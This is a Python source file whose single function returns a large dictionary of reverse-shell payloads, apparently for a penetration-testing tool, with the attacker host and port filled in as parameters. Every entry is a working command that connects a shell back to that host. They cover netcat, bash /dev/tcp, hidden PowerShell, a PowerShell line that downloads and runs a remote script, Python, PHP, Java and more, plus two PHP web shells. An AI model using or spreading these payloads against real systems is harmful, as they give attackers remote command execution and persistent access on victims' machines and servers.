def get_payloads(host, revshell_port, tls_port):
    return {
        'Network Tools': {
            'nc mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {revshell_port} >/tmp/f',
            'nc -e': f'nc {host} {revshell_port} -e sh',
            'nc.exe -e': f'nc.exe {host} {revshell_port} -e sh',
            'BusyBox nc -e': f'busybox nc {host} {revshell_port} -e sh',
            'nc -c': f'nc -c sh {host} {revshell_port}',
            'ncat -e': f'ncat {host} {revshell_port} -e sh',
            'ncat.exe -e': f'ncat.exe {host} {revshell_port} -e sh',
            'ncat udp': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {host} {revshell_port} >/tmp/f',
            'rustcat': f'rcat connect -s sh {host} {revshell_port}',
            'telnet': f'TF=$(mktemp -u);mkfifo $TF && telnet {host} {revshell_port} 0<$TF | sh 1>$TF',
            'OpenSSL': f'mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{revshell_port} > /tmp/s; rm /tmp/s',
            'socat #1': f'socat TCP:{host}:{revshell_port} EXEC:sh',
            'socat #2 (TTY)': f'socat TCP:{host}:{revshell_port} EXEC:\'sh\',pty,stderr,setsid,sigint,sane',
            'sqlite3 nc mkfifo': f'sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host}:{revshell_port} >/tmp/f\'',
        },
        'Bash / Zsh': {
            'Bash -i': f'sh -i >& /dev/tcp/{host}/{revshell_port} 0>&1',
            'Bash 196': f'0<&196;exec 196<>/dev/tcp/{host}/{revshell_port}; sh <&196 >&196 2>&196',
            'Bash read line': f'exec 5<>/dev/tcp/{host}/{revshell_port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            'Bash 5': f'sh -i 5<> /dev/tcp/{host}/{revshell_port} 0<&5 1>&5 2>&5',
            'Bash udp': f'sh -i >& /dev/udp/{host}/{revshell_port} 0>&1',
            'zsh': f'zsh -c \'zmodload zsh/net/tcp && ztcp {host} {revshell_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'',
        },
        'PowerShell / Windows': {
            'Windows ConPty': f'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {host} {revshell_port}',
            'PowerShell #1': f'$LHOST = "{host}"; $LPORT = {revshell_port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()',
            'PowerShell #2': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{revshell_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            'PowerShell #3': f"powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{host}', {revshell_port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()\"",
            'PowerShell #4 (TLS)': f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{host}', {tls_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()",
        },
        'Python': {
            'Python #1': f'export RHOST="{host}";export RPORT={revshell_port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
            'Python #2': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{revshell_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'',
            'Python3 #1': f'export RHOST="{host}";export RPORT={revshell_port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
            'Python3 #2': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{revshell_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'',
            'Python3 shortest': f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{host}",{revshell_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'',
        },
        'Ruby / Perl / PHP': {
            'Ruby #1': f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{host}",{revshell_port}))\'',
            'Ruby no sh': (
                f"ruby -rsocket -e 'exit if fork; "
                f"c=TCPSocket.new(\"{host}\",{revshell_port}); "
                f"while(cmd=c.gets); cmd.chomp!; "
                f"if cmd == \"exit\"; exit; "
                f"elsif cmd =~ /cd (.+)/; Dir.chdir($1); "
                f"else; IO.popen(cmd, 'r') {{|io| c.print io.read }}; "
                f"end; end'"
            ),
            'Perl': (
                f"perl -e 'use Socket;$i=\"{host}\";$p={revshell_port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");}}'"
            ),
            'Perl no sh': (
                f"perl -MIO -e '$p=fork;exit if($p);"
                f"$c=new IO::Socket::INET(PeerAddr,\"{host}:{revshell_port}\");"
                f"STDIN->fdopen($c,\"r\");$~->fdopen($c,\"w\");system $_ while <>;'"
            ),
            'PHP cmd 2': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
            'PHP cmd small': '<?=`$_GET[0]`?>',
            'PHP exec': f'php -r \'$sock=fsockopen("{host}",{revshell_port});exec("sh <&3 >&3 2>&3");\'',
            'PHP shell_exec': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});shell_exec(\"sh <&3 >&3 2>&3\");'",
            'PHP system': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});system(\"sh <&3 >&3 2>&3\");'",
            'PHP passthru': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});passthru(\"sh <&3 >&3 2>&3\");'",
            'PHP `': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});`sh <&3 >&3 2>&3`;'",
            'PHP popen': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});popen(\"sh <&3 >&3 2>&3\", \"r\");'",
            'PHP proc_open': f"php -r '$sock=fsockopen(\"{host}\",{revshell_port});$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        },
        'Compiled / Other': {
            'Haskell #1': (
                'module Main where\n'
                'import System.Process\n'
                f'main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc {host} {revshell_port} >/tmp/f"'
            ),
            'node.js': f"require('child_process').exec('nc -e sh {host} {revshell_port}')",
            'node.js #2': (
                f"(function(){{var net = require(\"net\"),cp = require(\"child_process\"),"
                f"sh = cp.spawn(\"sh\", []);var client = new net.Socket();"
                f"client.connect({revshell_port}, \"{host}\", function(){{"
                f"client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();"
            ),
            'Java #1': (
                f'public class shell {{public static void main(String[] args) {{Process p;try {{'
                f'p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{host}/{revshell_port} 0>&1");'
                f'p.waitFor();p.destroy();}} catch (Exception e) {{}}}}}}'
            ),
            'Java #2': (
                f'public class shell {{public static void main(String[] args) {{ProcessBuilder pb = '
                f'new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{host}/{revshell_port} 0>&1")'
                f'.redirectErrorStream(true);try {{Process p = pb.start();p.waitFor();p.destroy();}} '
                f'catch (Exception e) {{}}}}}}'
            ),
            'Groovy': (
                f'String host="{host}";int port={revshell_port};String cmd="sh";'
                f'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
                f'Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), '
                f'si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
                f'while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());'
                f'while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());'
                f'so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};'
                f'p.destroy();s.close();'
            ),
            'Lua #1': f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{host}','{revshell_port}');os.execute('sh -i <&3 >&3 2>&3');\"",
            'Lua #2': (
                f"lua5.1 -e 'local host, port = \"{host}\", {revshell_port} "
                f"local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") "
                f"tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() "
                f"local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) "
                f"if status == \"closed\" then break end end tcp:close()'"
            ),
            'Golang': (
                f"echo 'package main;import\"os/exec\";import\"net\";func main(){{"
                f'c,_:=net.Dial("tcp","{host}:{revshell_port}");cmd:=exec.Command("sh");'
                f"cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
            ),
            'Vlang': (
                f"echo 'import os' > /tmp/t.v && echo 'fn main() {{ os.system(\"nc -e sh {host} {revshell_port} 0>&1\") }}' "
                f'>> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v'
            ),
            'Awk': (
                f"awk 'BEGIN {{s = \"/inet/tcp/0/{host}/{revshell_port}\"; while(42) {{ "
                f'do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} '
                f'while(c != "exit") close(s); }}}}\' /dev/null'
            ),
            'Crystal (system)': (
                f'crystal eval \'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);'
                f'c.connect("{host}",{revshell_port});loop{{m,l=c.receive;p=Process.new(m.rstrip("\\n"),'
                f'output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}}\''
            ),
        },
    }
